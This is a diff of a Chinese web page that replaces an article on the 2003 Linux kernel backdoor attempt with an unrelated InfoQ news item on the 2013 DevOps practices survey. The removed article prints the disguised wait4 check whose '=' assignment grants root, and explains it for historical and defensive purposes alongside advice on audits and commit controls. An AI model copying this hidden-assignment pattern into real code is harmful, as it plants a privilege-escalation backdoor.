@@ -1,24 +1,23 @@
-<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /></head><body><h3>回顾Linux内核后门</h3><p>由于最近大众对美国国家安全局（NAS）的关注，人们的注意力转移到后门程序上。对于不熟悉该术语的人们，后门是一种有意在操作系统或软件中植入的漏洞，允许未授权的用户访问系统。在2003年曾经有人试图向Linux内核植入后门，虽然被发现了，但是这表明不论看上去多普通的变更都会引入漏洞，以及源码控制管理的重要性。</p>
-<p>Corbet在<a href="https://lwn.net/Articles/57135/">LVN.Net的文章</a>中首次提到以下这段代码，它把自己伪装成类似<a href="http://linux.die.net/man/2/wait4">wait4</a>函数的参数校验。</p>
-<pre>
-    if((options == (__WCLONE|__WALL)) &amp;&amp; (current-&gt;uid = 0))
-        retval = -EINVAL;
-</pre>
-<p>正常情况下没有任何影响，但是如果调用程序故意传入非法值，if表达式的第二部分就会执行。该部分会将程序的用户ID（current-&gt;uid）设为0,在Linux中就是root用户。</p>
-<p>一眼看上去这就像是一个简单的代码错误，开发人员经常疏忽将'=='写成'='。虽然你认为函数wait4不应该与用户ID有任何关系，但是很明显这是故意为为之。</p>
-<p>Corbet描述了该后门是如何被发现的</p>
-<blockquote>
-  CVS库中的每个变更都会包含反向链接信息，表明与BitKeeper中的变更相同。有问题的变更缺少这样的信息，所以很快就能辨认出来。 
- <br /> 
- <br /> 试图通过这种方式进行变更是很可疑的，至少可以这么说，所以我们非常关注变更请求到底是什么。
+<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /></head><body><h3>DevOps实践调查：寻找高效能实践</h3><p>DevOps运动方面的知名人士<a href="http://continuousdelivery.com/">Jez Humble</a>和<u><a href="http://www.realgenekim.me/">Gene Kim</a></u>，与<a href="http://puppetlabs.com/">Puppet Labs</a>一道携手推出了<a href="http://www.surveygizmo.com/s3/1483785/DevOps-Survey-2013">2013DevOps实践调查</a>。<a href="http://continuousdelivery.com/2013/12/the-science-behind-the-2013-puppet-labs-devops-survey-of-practice/">该调查的目的</a>是为了更好地了解，哪些IT实践能够驱动组织机构变得高效能。这项调查将在1月15日关闭，在此之前他们<a href="http://www.surveygizmo.com/s3/1483785/DevOps-Survey-2013">欢迎任何人参与其中</a>。</p>
+<p>2013 DevOps调查将试着找出哪些IT实践铸就了高效能组织机构。就像Jez和Gene<a href="http://continuousdelivery.com/2013/12/the-science-behind-the-2013-puppet-labs-devops-survey-of-practice/">最近在一篇文章所说的那样</a>，他们建立了若干研究假设，并将对它们进行测试和独立评估：</p>
+<ul> 
+ <li>小型团队，享有横跨整个价值流——开发、质量管理、IT运营和信息安全——的高度信任；</li> 
+ <li>在整个价值流范围内分享目标与痛楚；小批次的开发工作；</li> 
+ <li>具有持续、自动化的整合与创新的能力</li> 
+ <li>强调创建学习、实验和创新的文化；</li> 
+ <li>强调创建弹性系统。</li> 
+</ul>
+<p>该调查还将测试两项更加总体性的假设。它会尝试建立起前置时间（lead time，从设计到生产的时间）与产品质量、客户满意度和员工幸福度之间的关联。在去年的调查——将DevOps采用情况与更高的IT效能关联起来——的基础上，今年的调查将探索更高的IT效能对业务效能会产生怎样的影响（例如：资产利润率和市场份额）。</p>
+<p>针对该调查，Gene向InfoQ介绍了为什么认为它们颇具意义：</p>
+<blockquote> 
+ <p>我们将测试许多由Martin Fowler在在过去十五年间，在持续集成和交付方面提出的精妙的基础理论和实践，以期找到一些具体的证据，来展现这些理论和实践如何提升效能与生产力、业务价值或开发者幸福度。</p> 
 </blockquote>
-<p>攻击者曾经再次向BitKeeper库的CVS克隆库中植入后门。他继续说道</p>
-<blockquote>
-  CVS代码库是从BitKeeper生成的，但是补丁程序进入BitKeeper代码库并不经过它。所以有问题的代码只会影响基于CVS代码库工作的用户。发行商使用的内核不是来自该库，这次事故也说明，问题代码能够驻留很长一段时间。
+<p>在进行<a href="https://puppetlabs.com/2013-state-of-devops-infographic">2012 DevOps实践调查</a>时，共收回4039份调查反馈。<a href="http://www.slideshare.net/realgenekim/2013-velocity-devops-metrics-its-not-just-for-webops-any-more">从这些反馈中可以看出</a>，高效能组织机构拥有某些共有模式。与低效能组织机构相比，这些高效能组织机构的部署速度是前者的30倍，它们拥有更短的<a href="http://en.wikipedia.org/wiki/Lead_time">前置时间</a>——只需要几小时甚至几分钟，而不是数周乃至数月。此外它们所经受的变更失败也要少一半（例如：生产中断或服务缺陷）；同时其恢复的平均时间则是低效能组织机构的1/12。</p>
+<p>DevOps实践调查是一份跨群体研究。前面提到的Gene和Kim的文章解释道，这类研究是一种“统计学上的研究技术，用来发现哪些因素（例如实践、文化规范等等）与结果（例如IT效能）相关”，一般用在诸如医学研究等方面。与其他一些IT世界中用来支撑假设的更常用的方法相比，跨群体研究更为严苛。</p>
+<p><img width="600" _p="true" _href="img://null" alt="" src="http://infoqstatic.com/resource/news/2014/01/2013-devops-survey/zh/resources/0110010.jpg" /></p>
+<p>Gene希望今年的调查中，来自开发者的反馈所占的比重能够比2012年的调查更高：</p>
+<blockquote> 
+ <p>我们已经收集了超过4千份反馈——这个数字已经超过了去年。但我们非常希望今年能够收集到更多数量的来自开发者的反馈，以确保我们能够对DevOps中的开发部分进行测量——去年的调研反馈，更偏重于DevOps中的运营部分。</p> 
 </blockquote>
-<p>大家想象一下，如果有人向代码库发起这样的攻击，增加几行看上去很好的代码，实际上植入了一个后门，而代码库没有Linux内核团队的控制和严格检查，你如何保护自己不受攻击。</p>
-<p>一种方式是在应用程序中创建自己的“内核”，只有这段代码可以改变用户的角色和权限。其他的代码只是获取到用户权限的只读视图，这样他们就不能轻易得获取root权限。</p>
-<p>在这样的模型中，&quot;current-&gt;uid=0&quot;这样的代码不会编译。如果任何人想实施攻击，或是直接修改应用程序的安全模块，但是我们会密切关注这样的修改，或是使用反射的伎俩，但是反射代码肯定比简单的赋值操作更容易被察觉到。</p>
-<p>如果语言层面支持，一种更好的方式是使用户权限完全不可变。这种方式能够更大程度限制攻击发生的地方，只能是创建权限的地方。</p>
-<p>这些措施应该配合对源码控制服务器的限制进行实施。一是限制尽可能少的人向主分支中提交代码，而不是过于开放；二是安全敏感代码默认应该完全锁定，只能根据问题具体情况授予编辑权限，实施的具体方法依赖此人是否使用分布式或集中式的源码控制以及具体的产品。</p>
-<p>如果没有在变更代码成为产品之前进行审计，最终这些技术都会失效，这些措施只能减少审计疏漏问题发生的可能性。</p><br><br><br><br><br><br></body></html>
+<p><a href="http://www.surveygizmo.com/s3/1483785/DevOps-Survey-2013">该调查将在1月15日关闭</a>，并将在2014年中期的Velocity大会上发布调查结果。</p>
+<p><strong>查看英文原文：</strong><a href="http://www.infoq.com/news/2014/01/2013-devops-survey">Jez Humble and Gene Kim in Search of High Performing Practices with DevOps Survey</a></p><br><br><br><br><br><br></body></html>
